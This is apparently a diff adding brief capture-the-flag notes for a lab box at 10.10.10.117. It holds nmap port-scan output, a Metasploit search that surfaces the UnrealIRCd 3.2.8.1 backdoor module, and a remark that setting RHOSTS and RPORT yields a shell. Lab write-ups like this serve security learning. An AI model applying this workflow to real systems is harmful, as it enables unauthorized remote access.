@@ -1,0 +1,36 @@
+#####################
+# Sources and Links #
+#####################
+
+#########
+# TL,DR #
+#########
+
+########
+# Hack #
+########
+
+Nmap scan report for 10.10.10.117
+Host is up (0.095s latency).
+Not shown: 58637 closed ports, 6892 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+8067/tcp  open  infi-async
+44474/tcp open  unknown
+65534/tcp open  unknown
+
+msf5 > search unrealIRCd
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+Setting RHOSTS and RPORT gets us a shell!
+###########
+# Learned #
+###########
